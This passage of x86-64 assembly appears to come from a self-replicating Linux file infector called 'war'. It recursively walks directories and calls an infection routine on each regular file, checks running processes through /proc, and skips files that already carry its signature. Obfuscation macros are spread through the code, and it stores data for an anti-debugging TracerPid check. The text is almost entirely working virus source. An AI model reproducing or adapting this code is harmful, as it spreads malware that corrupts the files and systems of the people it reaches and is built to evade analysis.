		cmp rax, 0				; if (nread <= 0)
		jle war_end				;	return
		mov r11, rax

		xor rcx, rcx
		war_while_read:											; while (rcx < nread)
			OBF1 0x0f
			lea rdi, [rsp + rcx + linux_dirent.d_name]			;	char *d_name = &(buf[rcx].d_name)
			lea rsi, [rel point]
			call strcmp
			cmp rax, 0											;	if (strcmp(d_name, ".") == 0)
			je war_while_read_increase							;		jmp

			lea rdi, [rsp + rcx + linux_dirent.d_name]			;	d_name = &(buf[rcx].d_name)
			lea rsi, [rel pointt]
			call strcmp
			cmp rax, 0											;	if (strcmp(d_name, "..") == 0)
			je war_while_read_increase							;		jmp

			OBF_USELESS 0xcf
			xor rax, rax
			mov ax, WORD[rsp + rcx + linux_dirent.d_reclen]
			dec rax
			add rax, rcx
			xor r12, r12
			mov r12b, BYTE[rsp + rax]							;	d_type = buf[rcx].d_reclen - 1
			cmp r12b, DT_REG
			je war_while_read_cat
			cmp r12b, DT_DIR									;	if (d_type != DT_REG && d_type != DT_DIR)
			jne war_while_read_increase							;		jmp

			war_while_read_cat:									;	if (d_type == DT_REG && d_type == DT_DIR)
				MOV_OBF2 rdi, r8
				lea rsi, [rsp + rcx + linux_dirent.d_name]		;		d_name = &(buf[rcx].d_name)
				
				; save registers
				push rcx
				push r8
				push r9
				push r10
				push r11
				push r12										;		d_type
				sub rsp, PATH_MAX								;		char path[PATH_MAX]

				OBF3
				lea rdx, [rsp]
				call strcat										;		rsp = strcat(folder, d_name, path)

				lea rdi, [rsp]
				mov rax, QWORD[rsp + PATH_MAX]					;		rax = d_type

				cmp r9, 1
				jne war_to_infection
				cmp rax, DT_DIR
				jne war_while_read_cat_clean
				call check_proc
				jmp war_while_read_cat_clean

				war_to_infection:
				OBF1 0x0f
				cmp rax, DT_REG
				jne war_while_read_cat_folder					;		if (d_type == REG)
				call infection									;			infection(path)
				jmp war_while_read_cat_clean
				war_while_read_cat_folder:						;		else
				mov rsi, 0
				call war										;			war(path, 0)

				war_while_read_cat_clean:
				; restore registers
				add rsp, PATH_MAX
				pop r12
				pop r11
				pop r10
				pop r9
				pop r8
				pop rcx

			war_while_read_increase:
			xor rax, rax
			mov ax, WORD[rsp + rcx + linux_dirent.d_reclen]
			add rcx, rax										;	rcx += buf[rcx].d_reclen
			cmp rcx, r11
			jl war_while_read
		
		jmp war_while

	war_end:
	MOV_OBF1 rax, CLOSE
	mov rdi, r10
	syscall				; close (fd)
	jmp _ret_obf

strcmp:					; rdi = str1;  rsi = str2
	ENTER 0

	strcmp_while:				; do
		mov dl, BYTE[rdi]		;	char a = *str1
		mov dh, BYTE[rsi]		;	char b = *str2
		cmp dl, 0				;	if (a == '\0')
		je strcmp_return		;		return
		inc rdi					;	str1++
		inc rsi					;	str2++
		OBF3
		cmp dl, dh
		je strcmp_while			; while (a == b)

	strcmp_return:
	xor rax, rax
	mov al, dl
	sub al, dh					; return (a - b)
	jmp _ret

strcat:					; rdi = str1;  rsi = str2;  rdx = dst
	ENTER_OBF 0

	strcat_while_1:				; do
		mov al, BYTE[rdi]		;	char c = *str1
		cmp al, 0				;	if (c == '\0')
		je strcat_slash			;		break
		mov BYTE[rdx], al		;	*dst = c
		inc rdi					;	str1++
		OBF1 0x0f
		inc rdx					;	dst++
		jmp strcat_while_1		; while (1)

	strcat_slash:
	mov BYTE[rdx], 0x2F			; *dst = '/'
	inc rdx						; dst++

	strcat_while_2:				; do
		mov al, BYTE[rsi]		;	char c = *str2
		OBF2 0x0f
		cmp al, 0				;	if (c == '\0')
		je strcat_end			;		break
		mov BYTE[rdx], al		;	*dst = c
		inc rsi					;	str2++
		inc rdx					;	dst++
		jmp strcat_while_2		; while (1)

	strcat_end:
	mov BYTE[rdx], 0			; *dst = '\0'
	jmp _ret_obf

strstr:					; rdi = haystack;  rsi = needle;  rdx = len
	ENTER_OBF 0
	push r8
	push r9		; save r8 & r9

	xor r8, r8									; int i = 0
	strstr_while_haystack:						; while (i < len)
		xor r9, r9								;	int j = 0
		strstr_while_needle:					;	do
			OBF_USELESS 0xcf
			mov al, BYTE[rdi + r8]				;		char a = haystack[i]
			mov bl, BYTE[rsi + r9]				;		char b = needle[j]
			cmp bl, 0							;		if (b == '\0')
			je strstr_finded					;			return 0
			cmp r8, rdx							;		if (i >= len)
			jae strstr_while_haystack_increase	;			break
			cmp al, bl							;		if (a != b)
			jne strstr_while_haystack_increase	;			break
			OBF1 0x0f
			inc r8								;		i++
			inc r9								;		j++
			cmp r9, 43							;		if (j >= 43)	43 = signature_len
			jge strstr_finded					;			return 0
			jmp strstr_while_needle				;	while (a == b)

		strstr_while_haystack_increase:
		sub r8, r9								;	i -= j
		inc r8									;	i++
		OBF2 0x0f
		cmp r8, rdx
		jb strstr_while_haystack

	mov rax, 1		; return 1
	jmp strstr_end

	strstr_finded:
	mov rax, 0

	strstr_end:
	pop r9
	pop r8
	jmp _ret

memcpy:					; rdi = dst;  rsi = src;  rdx = len
	ENTER 0

	cmp rsi, 0						; if (!src)
	je _ret							;	 return

	xor rcx, rcx					; int i = 0
	memcpy_while:					; while (i < len)
		OBF2 0x0f
		mov al, BYTE[rsi + rcx]		;	 char c = src[i]
		mov BYTE[rdi + rcx], al		;	 dst[i] = c
		inc rcx						;	 i++
		OBF1 0xcf
		cmp rcx, rdx
		jb memcpy_while

	jmp _ret_obf

memset:					; rdi = dst;  sil = src;  rdx = len
	ENTER_OBF 0

	cmp rdx, 0						; if (len == 0)
	je _ret							;	 return

	xor rcx, rcx					; int i = 0
	memset_while:					; while (i < len)
		mov BYTE[rdi + rcx], sil	;	 dst[i] = src
		inc rcx						;	 i++
		cmp rcx, rdx
		jb memset_while

	jmp _ret

_ret_obf:
	shl rbp, 2
	mov rsp, rbp
	shr rsp, 2
	pop rbp
	pop rdi
	jmp rdi

hex_nb:
	db "0123456789abcdef", 0

proc_name:
	db "test", 0x0a, 0
proc_dir:
	db "/proc", 0
proc_dir_name:
	db "comm", 0

dir1:
	db "/tmp/test", 0
dir2:
	db "/tmp/test2", 0

point:
	db ".", 0
pointt:
	db "..", 0

data_name:
	db ".data", 0
bss_name:
	db ".bss", 0

urandom:
	db "/dev/urandom", 0

key:
	db "0123456789abcdef", 0

proc_status:
	db "/proc/self/status", 0
tracerpid:
	db "TracerPid:", 9, 0
msg_anti_debug:
	db "DEBUGGING..", 0x0a, 0

signature:
	db "war version 1.0 (c)oded 2021 by lde-batz - 0123456789abcd", 0

_end:
